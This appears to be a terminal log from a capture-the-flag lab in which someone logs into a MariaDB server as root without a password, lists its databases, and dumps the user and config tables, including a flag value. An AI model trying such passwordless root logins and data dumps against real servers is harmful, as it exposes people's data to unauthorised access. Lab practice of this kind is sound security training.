```sql
$ mysql -u root -h 10.129.170.124                                                              
Welcome to the MariaDB monitor.  Commands end with ; or \g.                                      
Your MariaDB connection id is 76                                                                 
Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10                                              
                                                                                                 
Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.                             
                                                                                                 
Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.                   
                                                                                                 
MariaDB [(none)]> SHOW DATABASES;                                                                
+--------------------+                                                                           
| Database           |                                                                           
+--------------------+                                                                           
| htb                |                                                                           
| information_schema |                                                                           
| mysql              |                                                                           
| performance_schema |                                                                           
+--------------------+                                                                           
4 rows in set (0.020 sec)                                                                        
                                                                                                 
MariaDB [(none)]> USE information_schema;                                                        
Reading table information for completion of table and column names                               
You can turn off this feature to get a quicker startup with -A                                   
                                                                                                 
Database changed                                                                                 


MariaDB [information_schema]> SHOW DATABASES;                                                    
+--------------------+                                                                           
| Database           |                                                                           
+--------------------+                                                                           
| htb                |                                                                           
| information_schema |                                                                           
| mysql              |                                                                           
| performance_schema |                                                                           
+--------------------+                                                                           
4 rows in set (0.017 sec)                                                                        
                                                                                                 
MariaDB [information_schema]> USE htb                                                            
Display all 2063 possibilities? (y or n)                                                         
MariaDB [information_schema]> USE htb;                                                           
Reading table information for completion of table and column names                               
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [htb]> SHOW TABLES;
+---------------+
| Tables_in_htb |
+---------------+
| config        |
| users         |
+---------------+
2 rows in set (0.018 sec)

MariaDB [htb]> SELECT * FROM users;
+----+----------+------------------+
| id | username | email            |
+----+----------+------------------+
|  1 | admin    | admin@sequel.htb |
|  2 | lara     | lara@sequel.htb  |
|  3 | sam      | sam@sequel.htb   |
|  4 | mary     | mary@sequel.htb  |
+----+----------+------------------+
4 rows in set (0.023 sec)

MariaDB [htb]> SELECT * FROM config;
+----+-----------------------+----------------------------------+
| id | name                  | value                            |
+----+-----------------------+----------------------------------+
|  1 | timeout               | 60s                              |
|  2 | security              | default                          |
|  3 | auto_logon            | false                            |
|  4 | max_size              | 2M                               |
|  5 | flag                  | 7b4bec00d1a39e3dd4e021ec3d915da8 |
|  6 | enable_uploads        | false                            |
|  7 | authentication_method | radius                           |
+----+-----------------------+----------------------------------+
7 rows in set (0.016 sec)

```